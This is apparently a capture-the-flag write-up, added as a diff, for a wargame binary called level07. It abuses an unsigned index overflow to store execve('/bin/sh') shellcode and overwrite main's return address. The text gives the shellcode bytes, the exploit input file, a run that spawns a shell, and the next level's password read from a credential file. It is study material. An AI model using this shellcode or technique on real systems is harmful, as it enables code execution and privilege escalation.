@@ -1,0 +1,226 @@
+level07@OverRide:~$ objdump -R level07
+
+level07:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a040 R_386_COPY        stdin
+0804a060 R_386_COPY        stdout
+0804a000 R_386_JUMP_SLOT   printf
+0804a004 R_386_JUMP_SLOT   fflush                     # ffluch "cleanse" env variable, making us unable to store shellcode there
+0804a008 R_386_JUMP_SLOT   getchar
+0804a00c R_386_JUMP_SLOT   fgets
+0804a010 R_386_JUMP_SLOT   __stack_chk_fail
+0804a014 R_386_JUMP_SLOT   puts
+0804a018 R_386_JUMP_SLOT   __gmon_start__
+0804a01c R_386_JUMP_SLOT   __libc_start_main
+0804a020 R_386_JUMP_SLOT   memset
+0804a024 R_386_JUMP_SLOT   __isoc99_scanf
+
+> ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+
+# We have a prog that loop and wait for command, the first is store
+Input command: store
+ Number: 1
+ Index: 1
+ Completed store command successfully
+ 
+Input command: store
+ Number: 0
+ Index: 123
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+ 
+# The Number and Index are get with scanf %u, so no negative -1 become 4294967295
+# Read functionne the same way and we are allowed to acces wil index, [0]
+# We have other index reserved for index % 3 == 0
+
+
+
+ 804864c:	e8 1f fe ff ff       	call   8048470 <printf@plt>
+ 8048651:	e8 91 ff ff ff       	call   80485e7 <get_unum>
+ 8048656:	89 45 f0             	mov    %eax,-0x10(%ebp)         # Where number is stored
+
+
+ 8048666:	e8 7c ff ff ff       	call   80485e7 <get_unum>
+ 804866b:	89 45 f4             	mov    %eax,-0xc(%ebp)          # Where index is stored
+ 804866e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
+ 8048671:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
+ 8048676:	89 c8                	mov    %ecx,%eax
+ 8048678:	f7 e2                	mul    %edx
+ 804867a:	d1 ea                	shr    %edx
+ 804867c:	89 d0                	mov    %edx,%eax
+ 804867e:	01 c0                	add    %eax,%eax
+ 8048680:	01 d0                	add    %edx,%eax# 
+ 8048682:	89 ca                	mov    %ecx,%edx
+ 8048684:	29 c2                	sub    %eax,%edx
+ 8048686:	85 d2                	test   %edx,%edx
+ 8048688:	74 0d                	je     8048697 <store_number+0x67>
+
+# Check if index % 3 == 0 and jump to error return
+https://stackoverflow.com/questions/44212301/efficient-mod-3-in-x86-assembly # Common Knowledge ofc
+
+# Ok so we know we can store data as unsigned int (4 bytes) in this array and that some value are inaccessible (n % 3 == 0), we can't use env_var,
+there is no buffer we can directly overflow, no weak printf nor function, no call of `/bin/sh`
+# That mean we have to find a way the store shellcode somewhere and exec it, luckily we have an array that store u_int for us
+# Sure, sure but when can we force the stack to exec the code ?
+
+# Well FIRST, store the shellcode is a probleme cause we can acces 2 on 3 var
+Shellcode: "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" # execve("/bin/sh") on 21 bytes
+# 21 / 4 = 5.25, so we can't store our shellcode in a normal way, the question is how to we acces the array at index 0 and 3
+# Since it's u_int, we can try like we previously did with the underflow by giving out how range value
+
+# The u_int_32_max value = 4294967295 (+1 to overflow) but we can't use it this raw because
+80486c5:	c1 e0 02 shl    $0x2,%eax # This take the index value and multiply it by 4, so we need to divide ou value by 4
+
+(4294967295 + 1) / 4 = 1073741824
+1073741824 % 3 == 1 so it's ok
+
+# So let's try
+Input command: store
+ Number: 9
+ Index: 0
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+ 
+ Input command: store
+ Number: 8
+ Index: 1073741824
+ Completed store command successfully
+Input command: read
+ Index: 0
+ Number at data[0] is 8
+ Completed read command successfully
+ 
+# POG we store it at index[0] so we can store the full shellcode (don't forget LES PETITS PEAUX ROUGES and we store u_int not hex)
+# Now we need to find a way to exec it, one option is to override the return of a function like the FOCKING MAIN
+# How do we get this adress ?
+
+# Break point before we quit the prog
+0x080489f0 <+717>:	pop    %ebp
+0x080489f1 <+718>:	ret
+   
+Breakpoint 2, 0x080489f0 in main ()
+(gdb) i f
+Stack level 0, frame at 0xffffd6e0:
+ eip = 0x80489f0 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd6d8, args:
+ Locals at 0xffffd6d8, Previous frame's sp is 0xffffd6e0
+ Saved registers:
+  ebp at 0xffffd6d8, eip at 0xffffd6dc
+  
+# We have save EIP and we need the array adress in order to find the offset
+# We need to put a breakpoint anywhere we use the array (for exemple in the read function) and find the addr
+(gdb) x $ebp+0x8
+0xffffd4f0:	0xffffd514
+
+# Now we find the offset AND ZIOUM (eip - array)
+> 0xffffd6dc - 0xffffd514
+456 
+> _ / 4
+114.0     # Have have a div by 3 index (School trick, sum all num (1+1+4 = 6) if it's multiple of 3 your number is too
+
+# So we need to use u_int property again
+1073741824 + 114 = 1073741938
+
+> Input command: store
+ Number: 12
+ Index: 1073741938
+ Completed store command successfully
+> Input command: read
+ Index: 114
+ Number at data[114] is 12
+ Completed read command successfully
+> Input command: quit
+Segmentation fault (core dumped)        # Segfault cause we override, main return, if you don't get why, read again stack functionement
+
+# Let's store our shellcode (split 4 bytes, format to endian used, convert to int and store to index from 0 to x)
+"\x6a\x0b\x58\x99" "\x52\x68\x2f\x2f" \x73\x68\x68\x2f" "\x62\x69\x6e\x89" "\xe3\x31\xc9\xcd" "\x80"
+[0] -> [1073741824] = \x99\x58\x0b\x6a = 2572684138
+[1] = \x2f\x2f\x68\x52 = 791636050
+[2] = \x2f\x68\x68\x73 = 795371635
+[3] -> [1073741827] = \x89\x6e\x69\x62 = 2305714530
+[4] = \xcd\xc9\x31\xe3 = 3452514787
+[5] = \x80 = 128
+
+[114] -> [1073741938] = 0xffffd514 = 4294956308
+# Not working, the stack is probably ramble a bit so we don't have the correct address
+# We can try to find it during the execution, since we previously found the adress we can use it (0xffffd4f0:	0xffffd514)
+> 0xffffd4f0 - 0xffffd514
+-36
+> _ / 4
+-9.0
+
+# When we check at array -9 we get accurate location in the stack
+# Ok we test run exploit, read [-9] during exec, then store the value in [114]
+
+------/tmp/exploit------
+store
+2572684138
+1073741824
+store
+791636050
+1
+store
+795371635
+2
+store
+2305714530
+1073741827
+store
+3452514787
+4
+store
+128
+5
+------------------------
+
+
+# WE GO BRRRR
+> cat /tmp/exploit - | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+read
+Input command:  Index: -9
+ Number at data[4294967287] is 4294956356
+ Completed read command successfully
+store
+Input command:  Number: 4294956356
+ Index: 1073741938
+ Completed store command successfully
+quit
+whoami
+level08
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
